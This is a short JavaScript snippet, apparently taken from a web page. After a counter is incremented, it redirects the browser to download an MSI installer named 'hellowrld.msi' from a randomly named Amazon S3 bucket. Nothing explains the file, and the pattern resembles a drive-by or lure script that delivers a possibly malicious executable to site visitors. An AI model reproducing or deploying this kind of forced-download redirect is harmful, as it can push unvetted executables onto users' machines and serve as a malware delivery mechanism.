function loadUrl()
{
	if(num>=1)
	{
		var url="https://eythw.s3.ap-southeast-2.amazonaws.com/hellowrld.msi";
		window.location=url;
	}
}

var num=0;
function getLoad()
{
	num++;
}
